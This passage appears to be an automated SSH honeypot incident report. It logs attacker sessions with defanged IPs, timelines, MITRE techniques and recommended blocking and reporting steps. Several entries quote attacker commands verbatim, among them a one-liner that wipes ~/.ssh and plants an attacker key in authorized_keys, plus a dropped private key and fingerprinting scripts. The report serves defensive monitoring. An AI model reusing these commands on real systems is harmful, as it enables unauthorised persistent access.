**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:07:07` | `cowrie.session.connect` |
| `2026-09-09 17:07:08` | `cowrie.client.version` |
| `2026-09-09 17:07:08` | `cowrie.client.kex` |
| `2026-09-09 17:07:15` | `cowrie.login.success` |
| `2026-09-09 17:07:19` | `cowrie.session.params` |
| `2026-09-09 17:07:19` | `cowrie.command.input` |
| `2026-09-09 17:07:21` | `cowrie.log.closed` |
| `2026-09-09 17:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f82581f68d97

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:08 |
| **Last Seen** | 2026-09-09 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:08:07` | `cowrie.session.connect` |
| `2026-09-09 17:08:07` | `cowrie.client.version` |
| `2026-09-09 17:08:07` | `cowrie.client.kex` |
| `2026-09-09 17:08:07` | `cowrie.login.success` |
| `2026-09-09 17:08:08` | `cowrie.session.params` |
| `2026-09-09 17:08:08` | `cowrie.command.input` |
| `2026-09-09 17:08:08` | `cowrie.log.closed` |
| `2026-09-09 17:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e222cf102ff6

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-09 17:09 |
| **Last Seen** | 2026-09-09 17:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:09:14` | `cowrie.session.connect` |
| `2026-09-09 17:09:15` | `cowrie.client.version` |
| `2026-09-09 17:09:15` | `cowrie.client.kex` |
| `2026-09-09 17:09:20` | `cowrie.login.success` |
| `2026-09-09 17:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caa10a89d7c3

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-09 17:09 |
| **Last Seen** | 2026-09-09 17:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:09:22` | `cowrie.session.connect` |
| `2026-09-09 17:09:22` | `cowrie.client.version` |
| `2026-09-09 17:09:22` | `cowrie.client.kex` |
| `2026-09-09 17:09:23` | `cowrie.login.success` |
| `2026-09-09 17:09:24` | `cowrie.session.params` |
| `2026-09-09 17:09:24` | `cowrie.command.input` |
| `2026-09-09 17:09:25` | `cowrie.session.file_download` |
| `2026-09-09 17:09:25` | `cowrie.session.file_download` |
| `2026-09-09 17:09:25` | `cowrie.log.closed` |
| `2026-09-09 17:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62d2a17acb0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:09 |
| **Last Seen** | 2026-09-09 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:09:50` | `cowrie.session.connect` |
| `2026-09-09 17:09:50` | `cowrie.client.version` |
| `2026-09-09 17:09:51` | `cowrie.client.kex` |
| `2026-09-09 17:09:51` | `cowrie.login.success` |
| `2026-09-09 17:09:52` | `cowrie.session.params` |
| `2026-09-09 17:09:52` | `cowrie.command.input` |
| `2026-09-09 17:09:52` | `cowrie.log.closed` |
| `2026-09-09 17:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b8f3ef496fa

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:09 |
| **Last Seen** | 2026-09-09 17:10 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:09:54` | `cowrie.session.connect` |
| `2026-09-09 17:09:55` | `cowrie.client.version` |
| `2026-09-09 17:09:55` | `cowrie.client.kex` |
| `2026-09-09 17:10:01` | `cowrie.login.success` |
| `2026-09-09 17:10:04` | `cowrie.session.params` |
| `2026-09-09 17:10:04` | `cowrie.command.input` |
| `2026-09-09 17:10:06` | `cowrie.log.closed` |
| `2026-09-09 17:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-974c4f2148c2

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]61` |
| **First Seen** | 2026-09-09 17:09 |
| **Last Seen** | 2026-09-09 17:14 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:09:56` | `cowrie.session.connect` |
| `2026-09-09 17:09:56` | `cowrie.client.version` |
| `2026-09-09 17:09:56` | `cowrie.client.kex` |
| `2026-09-09 17:09:57` | `cowrie.login.success` |
| `2026-09-09 17:09:58` | `cowrie.session.params` |
| `2026-09-09 17:09:58` | `cowrie.command.input` |
| `2026-09-09 17:09:58` | `cowrie.command.failed` |
| `2026-09-09 17:09:59` | `cowrie.log.closed` |
| `2026-09-09 17:10:00` | `cowrie.session.params` |
| `2026-09-09 17:10:00` | `cowrie.command.input` |
| `2026-09-09 17:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]61` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82bb8825a80c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:11 |
| **Last Seen** | 2026-09-09 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:11:30` | `cowrie.session.connect` |
| `2026-09-09 17:11:30` | `cowrie.client.version` |
| `2026-09-09 17:11:30` | `cowrie.client.kex` |
| `2026-09-09 17:11:30` | `cowrie.login.success` |
| `2026-09-09 17:11:31` | `cowrie.session.params` |
| `2026-09-09 17:11:31` | `cowrie.command.input` |
| `2026-09-09 17:11:31` | `cowrie.log.closed` |
| `2026-09-09 17:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a786ac066f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:12 |
| **Last Seen** | 2026-09-09 17:13 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:12:55` | `cowrie.session.connect` |
| `2026-09-09 17:12:55` | `cowrie.client.version` |
| `2026-09-09 17:12:55` | `cowrie.client.kex` |
| `2026-09-09 17:13:00` | `cowrie.login.success` |
| `2026-09-09 17:13:04` | `cowrie.session.params` |
| `2026-09-09 17:13:04` | `cowrie.command.input` |
| `2026-09-09 17:13:05` | `cowrie.log.closed` |
| `2026-09-09 17:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b2cb94f921

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:13 |
| **Last Seen** | 2026-09-09 17:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:13:06` | `cowrie.session.connect` |
| `2026-09-09 17:13:06` | `cowrie.client.version` |
| `2026-09-09 17:13:06` | `cowrie.client.kex` |
| `2026-09-09 17:13:06` | `cowrie.login.success` |
| `2026-09-09 17:13:07` | `cowrie.session.params` |
| `2026-09-09 17:13:07` | `cowrie.command.input` |
| `2026-09-09 17:13:07` | `cowrie.log.closed` |
| `2026-09-09 17:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d305ea63c4

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-09-09 17:14 |
| **Last Seen** | 2026-09-09 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:14:10` | `cowrie.session.connect` |
| `2026-09-09 17:14:10` | `cowrie.client.version` |
| `2026-09-09 17:14:10` | `cowrie.client.kex` |
| `2026-09-09 17:14:10` | `cowrie.login.success` |
| `2026-09-09 17:14:10` | `cowrie.session.params` |
| `2026-09-09 17:14:10` | `cowrie.command.input` |
| `2026-09-09 17:14:10` | `cowrie.command.failed` |
| `2026-09-09 17:14:10` | `cowrie.log.closed` |
| `2026-09-09 17:14:11` | `cowrie.session.params` |
| `2026-09-09 17:14:11` | `cowrie.command.input` |
| `2026-09-09 17:14:11` | `cowrie.session.file_download` |
| `2026-09-09 17:14:11` | `cowrie.log.closed` |
| `2026-09-09 17:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-426a2ba50e3d

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-09-09 17:14 |
| **Last Seen** | 2026-09-09 17:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:14:11` | `cowrie.session.connect` |
| `2026-09-09 17:14:11` | `cowrie.client.version` |
| `2026-09-09 17:14:11` | `cowrie.client.kex` |
| `2026-09-09 17:14:11` | `cowrie.login.success` |
| `2026-09-09 17:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0759ff1a9e50

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-09-09 17:14 |
| **Last Seen** | 2026-09-09 17:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:14:11` | `cowrie.session.connect` |
| `2026-09-09 17:14:11` | `cowrie.client.version` |
| `2026-09-09 17:14:11` | `cowrie.client.kex` |
| `2026-09-09 17:14:11` | `cowrie.login.success` |
| `2026-09-09 17:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3da214c780c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:14 |
| **Last Seen** | 2026-09-09 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:14:43` | `cowrie.session.connect` |
| `2026-09-09 17:14:43` | `cowrie.client.version` |
| `2026-09-09 17:14:43` | `cowrie.client.kex` |
| `2026-09-09 17:14:44` | `cowrie.login.success` |
| `2026-09-09 17:14:45` | `cowrie.session.params` |
| `2026-09-09 17:14:45` | `cowrie.command.input` |
| `2026-09-09 17:14:45` | `cowrie.log.closed` |
| `2026-09-09 17:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c8c62cdc6d1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-09 17:15 |
| **Last Seen** | 2026-09-09 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:15:31` | `cowrie.session.connect` |
| `2026-09-09 17:15:31` | `cowrie.client.version` |
| `2026-09-09 17:15:31` | `cowrie.client.kex` |
| `2026-09-09 17:15:33` | `cowrie.login.success` |
| `2026-09-09 17:15:33` | `cowrie.direct-tcpip.request` |
| `2026-09-09 17:15:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-09 17:15:33` | `cowrie.direct-tcpip.data` |
| `2026-09-09 17:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715299b3865c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:15 |
| **Last Seen** | 2026-09-09 17:16 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:15:44` | `cowrie.session.connect` |
| `2026-09-09 17:15:45` | `cowrie.client.version` |
| `2026-09-09 17:15:45` | `cowrie.client.kex` |
| `2026-09-09 17:15:52` | `cowrie.login.success` |
| `2026-09-09 17:15:58` | `cowrie.session.params` |
| `2026-09-09 17:15:58` | `cowrie.command.input` |
| `2026-09-09 17:15:59` | `cowrie.log.closed` |
| `2026-09-09 17:16:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d68c1073ffd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:16 |
| **Last Seen** | 2026-09-09 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:16:20` | `cowrie.session.connect` |
| `2026-09-09 17:16:20` | `cowrie.client.version` |
| `2026-09-09 17:16:20` | `cowrie.client.kex` |
| `2026-09-09 17:16:21` | `cowrie.login.success` |
| `2026-09-09 17:16:21` | `cowrie.session.params` |
| `2026-09-09 17:16:21` | `cowrie.command.input` |
| `2026-09-09 17:16:22` | `cowrie.log.closed` |
| `2026-09-09 17:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f021073a65d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:17 |
| **Last Seen** | 2026-09-09 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:17:53` | `cowrie.session.connect` |
| `2026-09-09 17:17:53` | `cowrie.client.version` |
| `2026-09-09 17:17:53` | `cowrie.client.kex` |
| `2026-09-09 17:17:53` | `cowrie.login.success` |
| `2026-09-09 17:17:54` | `cowrie.session.params` |
| `2026-09-09 17:17:54` | `cowrie.command.input` |
| `2026-09-09 17:17:54` | `cowrie.log.closed` |
| `2026-09-09 17:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0368d9b3c3f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:18 |
| **Last Seen** | 2026-09-09 17:18 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:18:40` | `cowrie.session.connect` |
| `2026-09-09 17:18:42` | `cowrie.client.version` |
| `2026-09-09 17:18:42` | `cowrie.client.kex` |
| `2026-09-09 17:18:49` | `cowrie.login.success` |
| `2026-09-09 17:18:52` | `cowrie.session.params` |
| `2026-09-09 17:18:52` | `cowrie.command.input` |
| `2026-09-09 17:18:54` | `cowrie.log.closed` |
| `2026-09-09 17:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ac755c6b9c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:19 |
| **Last Seen** | 2026-09-09 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:19:27` | `cowrie.session.connect` |
| `2026-09-09 17:19:27` | `cowrie.client.version` |
| `2026-09-09 17:19:27` | `cowrie.client.kex` |
| `2026-09-09 17:19:27` | `cowrie.login.success` |
| `2026-09-09 17:19:28` | `cowrie.session.params` |
| `2026-09-09 17:19:28` | `cowrie.command.input` |
| `2026-09-09 17:19:28` | `cowrie.log.closed` |
| `2026-09-09 17:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f9341e7994

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:21 |
| **Last Seen** | 2026-09-09 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:21:05` | `cowrie.session.connect` |
| `2026-09-09 17:21:05` | `cowrie.client.version` |
| `2026-09-09 17:21:05` | `cowrie.client.kex` |
| `2026-09-09 17:21:06` | `cowrie.login.success` |
| `2026-09-09 17:21:06` | `cowrie.session.params` |
| `2026-09-09 17:21:06` | `cowrie.command.input` |
| `2026-09-09 17:21:07` | `cowrie.log.closed` |
| `2026-09-09 17:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba5bc776d34

| Field | Detail |
|---|---|
